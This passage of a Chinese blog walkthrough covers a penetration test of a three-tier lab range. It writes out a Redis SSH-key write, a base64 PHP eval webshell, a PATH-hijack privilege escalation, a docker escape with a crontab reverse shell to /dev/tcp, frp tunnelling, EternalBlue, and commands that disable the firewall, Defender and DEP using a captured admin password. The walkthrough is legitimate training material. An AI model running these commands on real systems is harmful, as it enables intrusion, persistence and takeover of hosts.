src="https://raw.githubusercontent.com/chencicici/images/main/202208251731647.png"></p><p>现在有三个利用思路：</p><p>1、写webshell</p><p>2、写ssh公钥</p><p>3、写计划任务</p><p>这里有一点限制，2和3都需要root权限启动的redis才能执行，因为我们这里是用sudo启动的redis，所以可以直接写公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251736113.png"></p><p>添加首位换行，避免乱码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;<span class="built_in">cat</span> .ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure><p>设置备份路径并写入公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251745891.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat key.txt | redis-cli -h 192.168.31.112 -x set hack</span></span><br><span class="line">OK                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># redis-cli -h 192.168.31.112                          </span></span><br><span class="line">192.168.31.112:6379&gt; CONFIG SET <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; get hack</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>ssh免密登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251748310.png"></p><h2 id="上线到msf"><a href="#上线到msf" class="headerlink" title="上线到msf"></a>上线到msf</h2><p>使用 <code>exploit/multi/script/web_delivery</code>文件落地上线，这样比生成门后快一点</p><p>设置好payload和target</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251753859.png"></p><p>将运行结果复制到ssh shell中运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251754223.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251755439.png"></p><p>msf收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251756156.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在两张网卡，还有另一个网段52</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251758532.png"></p><p>添加路由把msf代理进去</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251802768.png"></p><p>msf主机存活扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep   ARP扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep   UDP扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname        NETBIOS扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum        SNMP扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version       SMB扫描</span><br></pre></td></tr></table></figure><p>msf端口扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack          TCP ACK端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn         SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp          TCP端口扫描  </span><br><span class="line">auxiliary/scanner/portscan/xmas         TCP XMas端口扫描</span><br></pre></td></tr></table></figure><p>反向代理使用nmap对52网段进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251822176.png"></p><p>添加代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>nmap扫描内网太慢了，而且这样走msf的proxy模块，很不稳定，必须走tcp流量，而30靶机开启了防火墙所以一直回显denied</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251823211.png"></p><p>关了防火墙用msf模块扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251910393.png"></p><p>浏览器挂上反向代理，或者直接用proxychains打开火狐</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281638036.png"></p><p>都存在web服务</p><p>30是通达oa</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281643909.png"></p><p>20是Laravel</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281644023.png"></p><h2 id="通达oa"><a href="#通达oa" class="headerlink" title="通达oa"></a>通达oa</h2><p>先看通达oa，爆出过不少漏洞，记得用proxychains代理检测工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281856843.png"></p><p>蚁剑直接添加socks4代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281857020.png"></p><p>直接就是system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282334020.png"></p><p>发现还有一个网段93&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282336253.png"></p><h2 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h2><p>52网段还存在一个Laravel框架的web服务，爆出了版本，存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282340685.png"></p><p>nginx反向代理，应该就是最开始dmz区的那台主机的81端口的服务，当时我忘了开机，所以访问502</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291516580.png"></p><p>下载exp，修改url <a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454654.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454003.png"></p><p>先写webshell到蚁剑，用base64写马不用担心转义问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291604397.png"></p><p>做信息收集发现主机名很奇怪，存在dockerenv文件应该是docker容器了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291618083.png"></p><p>用curl上线到msf，少很多命令要自己调整一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620253.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620897.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620654.png"></p><h2 id="提权-docker-逃逸"><a href="#提权-docker-逃逸" class="headerlink" title="提权+docker 逃逸"></a>提权+docker 逃逸</h2><p>先提权再逃逸，linux提权三板斧，有个shell看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291624635.png"></p><p>运行发现应该是个ps命令，是s权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291629184.png"></p><p>我们可以构造一个环境变量来替换这个shell文件达到提权目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /tmp/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>不知道为什么蚁剑里修改环境变量没生效，到msf里修改生效了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291643013.png"></p><p>反弹一个shell到nc吧，半交互式shell方便一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644021.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644168.png"></p><p>提权完成，开始逃逸，docker逃逸一般都是特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动，提权模式可以访问宿主机文件</p><p>特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291649458.png"></p><p>将本地目录挂载到宿主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fdisk -l <span class="comment">#查看磁盘文件</span></span><br><span class="line"><span class="built_in">mkdir</span> /xx <span class="comment">#新建一个目录用于挂载</span></span><br><span class="line">mount /dev/sda1 /chan <span class="comment">#将宿主机/dev/sda1目录挂载到容器内</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291652293.png"></p><p>再利用计划任务反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; <span class="built_in">touch</span> shell.sh &amp;&amp; <span class="built_in">chmod</span> +x shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.31.119/7777 &lt;&amp;1&#x27;&quot;</span> &gt;&gt; shell.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291707522.png"></p><p>再写入计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /xx/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /xx/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291708320.png"></p><p>kali监听</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291709096.png"></p><p>再上线到msf维持权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291712971.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><p>现在拿到的权限有，dmz区域的外网靶机，和两台52网段的靶机.根据拿到的靶机发现还存在第三层网络93网段，并且存在域环境</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291715801.png"></p><p>添加到93网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291747112.png"></p><p>因为第二层是出网的，也可以上线cs抓一下密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111736209.png"></p><p>再用fscan扫描内网</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208292022634.png"></p><p>扫出30和40两个主机，30为dc，都存在17010永恒之蓝，上传frp配置代理到web2，因为第二层是出网的，所以直接配置一层就行（msf的隧道不稳经常掉）</p><h2 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h2><p>kali配置服务端frps.ini，启动</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111646665.png"></p><p>web2配置frpc.ini，启动方法一样</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">31.118</span> <span class="comment">#kali ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp             </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>     <span class="comment">#转发端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 </span><br></pre></td></tr></table></figure><p>porxychins添加一条，其他工具就可以走这个代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><p>msf添加一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>尝试永恒之蓝，这里要注意使用正向payload，因为目标靶机是不出网的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704262.png"></p><p>成功拿到192.168.93.40的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704743.png"></p><p>打域控的时候发现利用成功但是没返回会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111712516.png"></p><p>应该是没关防火墙，用winexe登录到域控上去把防火墙关了，前面已经用cs抓到管理员的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%Whoami2021&#x27;</span> //192.168.93.30 cmd.exe</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off #关闭防火墙</span><br><span class="line"><span class="built_in">net</span> stop windefend #关闭windefebd</span><br><span class="line">bcdedit.exe /<span class="built_in">set</span>&#123;current&#125; nx AlwaysOff #关闭DEP</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111723579.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111724439.png"></p><p>关闭防火墙后继续打，成功拿下DC</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111725473.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;DMZ区IP段为192.168.1.1&amp;#x2F;24 复制物理机网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第二层网络环境IP段为192.168.52.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第三层网络环境IP段为192.168.93.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;网络设置&quot;&gt;&lt;a href=&quot;#网络设置&quot; class=&quot;headerlink&quot; title=&quot;网络设置&quot;&gt;&lt;/a&gt;网络设置&lt;/h2&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
